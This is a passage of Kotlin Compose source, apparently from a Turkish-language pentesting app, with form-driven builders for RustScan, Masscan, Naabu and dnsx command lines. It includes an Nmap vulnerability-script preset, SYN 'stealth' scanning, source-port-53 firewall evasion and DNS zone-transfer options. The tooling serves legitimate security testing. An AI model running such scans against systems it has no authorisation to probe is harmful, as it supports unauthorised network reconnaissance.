// 2. RUSTSCAN
@Composable
fun RustScanBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.100") }
    var isAddressList by remember { mutableStateOf(false) }
    var portOption by remember { mutableStateOf("full") }
    var customRange by remember { mutableStateOf("1-65535") }
    var batchSize by remember { mutableStateOf("4500") }
    var ulimit by remember { mutableStateOf("5000") }
    var timeout by remember { mutableStateOf("1500") }
    var scanOrder by remember { mutableStateOf("serial") }
    var accessible by remember { mutableStateOf(false) }
    var greppable by remember { mutableStateOf(false) }
    var noConfig by remember { mutableStateOf(false) }

    // Nmap Entegrasyonu (Piping)
    var pipeNmap by remember { mutableStateOf(true) }
    var nmapPreset by remember { mutableStateOf("default") }
    var customNmapFlags by remember { mutableStateOf("-sC -sV -Pn") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            ToggleChip("Tek Hedef (-a)", !isAddressList, modifier = Modifier.weight(1f)) { isAddressList = false }
            ToggleChip("Hedef Listesi (--addresses)", isAddressList, modifier = Modifier.weight(1f)) { isAddressList = true }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text(if (isAddressList) "Adres Listesi Dosyası (hosts.txt)" else "Hedef IP / CIDR / Domain") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PORT SEÇENEKLERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("full" to "Tüm Portlar (1-65535)", "top" to "Top 1000 (--top)", "custom" to "Özel Aralık (-r)").forEach { (opt, lbl) ->
                val isSelected = portOption == opt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { portOption = opt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        if (portOption == "custom") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = customRange,
                onValueChange = { customRange = it },
                label = { Text("Port Aralığı (örn: 1-1000, 80,443,8080)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PERFORMANS VE LİMİTLER", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = batchSize,
                onValueChange = { batchSize = it },
                label = { Text("Batch Size (-b)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = ulimit,
                onValueChange = { ulimit = it },
                label = { Text("Ulimit (-u)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = timeout,
                onValueChange = { timeout = it },
                label = { Text("Timeout ms (-t)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "TARAMA DÜZENİ VE MODLAR", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("serial" to "Sıralı (Serial)", "random" to "Rastgele (Random)").forEach { (ord, lbl) ->
                val isSelected = scanOrder == ord
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { scanOrder = ord }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "--accessible Sade / Erişilebilir Çıktı", checked = accessible, onCheckedChange = { accessible = it })
        ToggleOption(label = "-g Grepable Çıktı Formatı", checked = greppable, onCheckedChange = { greppable = it })
        ToggleOption(label = "--no-config Yapılandırma Dosyalarını Yok Say", checked = noConfig, onCheckedChange = { noConfig = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "NMAP ENTEGRASYONU (PIPING)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "Açık Portları Nmap'e Aktar (-- <nmap bayrakları>)", checked = pipeNmap, onCheckedChange = { pipeNmap = it })
        if (pipeNmap) {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                listOf("default" to "Varsayılan (-sC -sV -Pn)", "aggressive" to "Agresif (-A -Pn)", "vuln" to "Zafiyet (--script=vuln)", "custom" to "Özel").forEach { (pre, lbl) ->
                    val isSelected = nmapPreset == pre
                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .clip(RoundedCornerShape(6.dp))
                            .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                            .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                            .clickable {
                                nmapPreset = pre
                                when (pre) {
                                    "default" -> customNmapFlags = "-sC -sV -Pn"
                                    "aggressive" -> customNmapFlags = "-A -Pn"
                                    "vuln" -> customNmapFlags = "-sV -Pn --script=vuln"
                                }
                            }
                            .padding(vertical = 6.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        Text(text = lbl, fontSize = 9.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                    }
                }
            }
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = customNmapFlags,
                onValueChange = { customNmapFlags = it },
                label = { Text("Nmap Bayrakları") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        // Live Command Synthesis
        val parts = mutableListOf("rustscan")
        if (isAddressList) {
            parts.addAll(listOf("--addresses", target.trim()))
        } else {
            parts.addAll(listOf("-a", target.trim()))
        }

        when (portOption) {
            "top" -> parts.add("--top")
            "custom" -> parts.addAll(listOf("-r", customRange.trim()))
            else -> parts.addAll(listOf("-r", "1-65535"))
        }

        parts.addAll(listOf("-b", batchSize.trim(), "-u", ulimit.trim(), "-t", timeout.trim()))
        if (scanOrder == "random") parts.addAll(listOf("--scan-order", "random"))
        if (accessible) parts.add("--accessible")
        if (greppable) parts.add("-g")
        if (noConfig) parts.add("--no-config")

        if (pipeNmap && customNmapFlags.isNotBlank()) {
            parts.add("--")
            parts.addAll(customNmapFlags.trim().split(" ").filter { it.isNotBlank() })
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 3. MASSCAN
@Composable
fun MasscanBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.0/24") }
    var isTargetFile by remember { mutableStateOf(false) }
    var portOption by remember { mutableStateOf("all") }
    var customPorts by remember { mutableStateOf("80,443,8080,8443") }
    var includeUdp by remember { mutableStateOf(false) }
    var udpPorts by remember { mutableStateOf("53,161,123") }
    var rate by remember { mutableStateOf("10000") }
    var iface by remember { mutableStateOf("eth0") }
    var routerMac by remember { mutableStateOf("") }
    var adapterIp by remember { mutableStateOf("") }
    var sourcePort53 by remember { mutableStateOf(false) }
    var excludeIp by remember { mutableStateOf("") }
    var banners by remember { mutableStateOf(true) }
    var ping by remember { mutableStateOf(false) }
    var waitTime by remember { mutableStateOf("10") }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            ToggleChip("Ağ CIDR / IP", !isTargetFile, modifier = Modifier.weight(1f)) { isTargetFile = false }
            ToggleChip("Dosyadan Oku (-iL)", isTargetFile, modifier = Modifier.weight(1f)) { isTargetFile = true }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text(if (isTargetFile) "Hedef Dosyası (-iL targets.txt)" else "Hedef Ağ (CIDR / IP / Aralık)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PORT SEÇENEKLERİ (-p)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("all" to "0-65535", "web" to "Web (80,443..)", "top100" to "Top 100", "top1000" to "Top 1000", "custom" to "Özel").forEach { (opt, lbl) ->
                val isSelected = portOption == opt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { portOption = opt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        if (portOption == "custom" || portOption == "web") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = customPorts,
                onValueChange = { customPorts = it },
                label = { Text("Port Listesi") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        ToggleOption(label = "UDP Portları Dahil Et (örn: U:53,161)", checked = includeUdp, onCheckedChange = { includeUdp = it })
        if (includeUdp) {
            OutlinedTextField(
                value = udpPorts,
                onValueChange = { udpPorts = it },
                label = { Text("UDP Portları (53,161,123)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PERFORMANS VE AĞ YAPILANDIRMASI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = rate,
                onValueChange = { rate = it },
                label = { Text("Paket Hızı (--rate pps)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = iface,
                onValueChange = { iface = it },
                label = { Text("Arayüz (-e eth0)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = excludeIp,
                onValueChange = { excludeIp = it },
                label = { Text("Hariç Tut (--exclude)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = routerMac,
                onValueChange = { routerMac = it },
                label = { Text("Router MAC (--router-mac)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        if (adapterIp.isNotBlank()) {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = adapterIp,
                onValueChange = { adapterIp = it },
                label = { Text("Adapter IP (--adapter-ip)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "BAYRAKLAR VE SEÇENEKLER", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "--banners Servis Başlıklarını Yakala (Banner Grab)", checked = banners, onCheckedChange = { banners = it })
        ToggleOption(label = "--ping ICMP Ping İstekleri Gönder", checked = ping, onCheckedChange = { ping = it })
        ToggleOption(label = "--source-port 53 Kaynak Portunu DNS (53) Yap", checked = sourcePort53, onCheckedChange = { sourcePort53 = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÇIKTI FORMATI (-o*)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "-oL Liste", "json" to "-oJ JSON", "gnmap" to "-oG Grepable", "xml" to "-oX XML", "none" to "Terminal").forEach { (f, lbl) ->
                val isSelected = outputFormat == f
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = f }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("sudo masscan")
        if (isTargetFile) {
            parts.addAll(listOf("-iL", target.trim()))
        } else {
            parts.add(target.trim())
        }

        var portStr = when (portOption) {
            "all" -> "0-65535"
            "top100" -> "--top-ports 100"
            "top1000" -> "--top-ports 1000"
            "web" -> customPorts.trim()
            "custom" -> customPorts.trim()
            else -> "0-65535"
        }

        if (portOption == "top100" || portOption == "top1000") {
            parts.addAll(portStr.split(" "))
        } else {
            if (includeUdp && udpPorts.isNotBlank()) {
                portStr = "$portStr,U:${udpPorts.trim()}"
            }
            parts.add("-p$portStr")
        }

        parts.add("--rate=${rate.trim()}")
        if (iface.isNotBlank()) parts.add("-e ${iface.trim()}")
        if (excludeIp.isNotBlank()) parts.addAll(listOf("--exclude", excludeIp.trim()))
        if (routerMac.isNotBlank()) parts.addAll(listOf("--router-mac", routerMac.trim()))
        if (adapterIp.isNotBlank()) parts.addAll(listOf("--adapter-ip", adapterIp.trim()))
        if (sourcePort53) parts.addAll(listOf("--source-port", "53"))
        if (banners) parts.add("--banners")
        if (ping) parts.add("--ping")
        if (waitTime.isNotBlank()) parts.addAll(listOf("--wait", waitTime.trim()))

        when (outputFormat) {
            "txt" -> parts.add("-oL masscan.txt")
            "json" -> parts.add("-oJ masscan.json")
            "gnmap" -> parts.add("-oG masscan.gnmap")
            "xml" -> parts.add("-oX masscan.xml")
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 4. NAABU
@Composable
fun NaabuBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("10.10.10.100") }
    var portOption by remember { mutableStateOf("top1000") }
    var customPorts by remember { mutableStateOf("80,443,8080,8443") }
    var excludePorts by remember { mutableStateOf("") }
    var scanType by remember { mutableStateOf("s") }
    var rate by remember { mutableStateOf("1000") }
    var concurrency by remember { mutableStateOf("25") }
    var timeout by remember { mutableStateOf("1000") }
    var retries by remember { mutableStateOf("1") }
    var warmUpTime by remember { mutableStateOf("2") }

    // CDN, Interface, Proxy
    var excludeCdn by remember { mutableStateOf(true) }
    var displayCdn by remember { mutableStateOf(false) }
    var iface by remember { mutableStateOf("") }
    var sourceIp by remember { mutableStateOf("") }
    var proxy by remember { mutableStateOf("") }

    // Entegrasyon & Çıktı
    var silent by remember { mutableStateOf(true) }
    var nmapPipe by remember { mutableStateOf(false) }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Hedef Host (-host) veya Liste Dosyası (-list targets.txt)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PORT SEÇENEKLERİ (-p / -top-ports)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("top100" to "Top 100", "top1000" to "Top 1000", "all" to "Tümü (-p -)", "custom" to "Özel").forEach { (opt, lbl) ->
                val isSelected = portOption == opt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { portOption = opt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        if (portOption == "custom") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = customPorts,
                onValueChange = { customPorts = it },
                label = { Text("Port Listesi (-p 80,443,8080)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = excludePorts,
            onValueChange = { excludePorts = it },
            label = { Text("Hariç Tutulacak Portlar (-exclude-ports 25,110) - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "TARAMA TÜRÜ (-s)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("s" to "SYN Stealth (-s s)", "c" to "TCP Connect (-s c)").forEach { (st, lbl) ->
                val isSelected = scanType == st
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { scanType = st }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PERFORMANS AYARLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = rate,
                onValueChange = { rate = it },
                label = { Text("Hız (-rate)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = concurrency,
                onValueChange = { concurrency = it },
                label = { Text("Concurrency (-c)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = timeout,
                onValueChange = { timeout = it },
                label = { Text("Timeout ms") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = retries,
                onValueChange = { retries = it },
                label = { Text("Yeniden Dene (-retries)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = warmUpTime,
                onValueChange = { warmUpTime = it },
                label = { Text("Isınma Süresi sn (-warm-up-time)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "CDN VE GÜVENLİK DUVARI FİLTRELERİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-exclude-cdn Cloudflare/Akamai CDN IP'lerini Atla", checked = excludeCdn, onCheckedChange = { excludeCdn = it })
        ToggleOption(label = "-display-cdn CDN Sağlayıcısını Ekrana Bas", checked = displayCdn, onCheckedChange = { displayCdn = it })
        ToggleOption(label = "-silent Sade Çıktı (Terminalde Sadece Portları Bas)", checked = silent, onCheckedChange = { silent = it })
        ToggleOption(label = "-nmap-cli 'nmap -sV -sC' Açık Portları Nmap'e Aktar", checked = nmapPipe, onCheckedChange = { nmapPipe = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "Metin (.txt)", "json" to "JSON (.json)", "csv" to "CSV (.csv)", "none" to "Sadece Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("naabu")
        if (target.trim().endsWith(".txt")) {
            parts.addAll(listOf("-list", target.trim()))
        } else {
            parts.addAll(listOf("-host", target.trim()))
        }

        when (portOption) {
            "top100" -> parts.addAll(listOf("-top-ports", "100"))
            "top1000" -> parts.addAll(listOf("-top-ports", "1000"))
            "all" -> parts.addAll(listOf("-p", "-"))
            "custom" -> parts.addAll(listOf("-p", customPorts.trim()))
        }

        if (excludePorts.isNotBlank()) {
            parts.addAll(listOf("-exclude-ports", excludePorts.trim()))
        }

        parts.addAll(listOf("-s", scanType, "-rate", rate.trim(), "-c", concurrency.trim(), "-timeout", timeout.trim()))
        if (retries.isNotBlank() && retries.trim() != "1") parts.addAll(listOf("-retries", retries.trim()))
        if (warmUpTime.isNotBlank() && warmUpTime.trim() != "2") parts.addAll(listOf("-warm-up-time", warmUpTime.trim()))
        if (excludeCdn) parts.add("-exclude-cdn")
        if (displayCdn) parts.add("-display-cdn")
        if (iface.isNotBlank()) parts.addAll(listOf("-interface", iface.trim()))
        if (sourceIp.isNotBlank()) parts.addAll(listOf("-source-ip", sourceIp.trim()))
        if (proxy.isNotBlank()) parts.addAll(listOf("-proxy", proxy.trim()))
        if (silent) parts.add("-silent")
        if (nmapPipe) parts.addAll(listOf("-nmap-cli", "'nmap -sV -sC'"))

        when (outputFormat) {
            "txt" -> parts.addAll(listOf("-o", "naabu_results.txt"))
            "json" -> parts.addAll(listOf("-json", "-o", "naabu_results.json"))
            "csv" -> parts.addAll(listOf("-csv", "-o", "naabu_results.csv"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 5. DNSX
@Composable
fun DnsxBuilder(language: AppLanguage) {
    var target by remember { mutableStateOf("target.com") }
    var wordlist by remember { mutableStateOf("") }

    // DNS Records
    var resolveA by remember { mutableStateOf(true) }
    var resolveAAAA by remember { mutableStateOf(false) }
    var resolveCname by remember { mutableStateOf(true) }
    var resolveMX by remember { mutableStateOf(false) }
    var resolveTXT by remember { mutableStateOf(false) }
    var resolvePTR by remember { mutableStateOf(false) }
    var resolveNS by remember { mutableStateOf(false) }
    var resolveSOA by remember { mutableStateOf(false) }
    var resolveSRV by remember { mutableStateOf(false) }
    var resolveAXFR by remember { mutableStateOf(false) }
    var resolveRecon by remember { mutableStateOf(false) }

    // Wildcard & Yanıt Filtreleri
    var wildcardFilter by remember { mutableStateOf(true) }
    var wildcardDomain by remember { mutableStateOf("") }
    var respOnly by remember { mutableStateOf(true) }
    var respOnlyValues by remember { mutableStateOf(false) }
    var customResolvers by remember { mutableStateOf("") }
    var threads by remember { mutableStateOf("100") }
    var rateLimit by remember { mutableStateOf("500") }
    var silent by remember { mutableStateOf(false) }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Hedef Alan Adı (-d) veya Alt Alan Listesi (-l subdomains.txt)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = wordlist,
            onValueChange = { wordlist = it },
            label = { Text("Kaba Kuvvet Kelime Listesi (-w wordlist.txt) - Opsiyonel") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "SORGULANACAK DNS KAYITLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
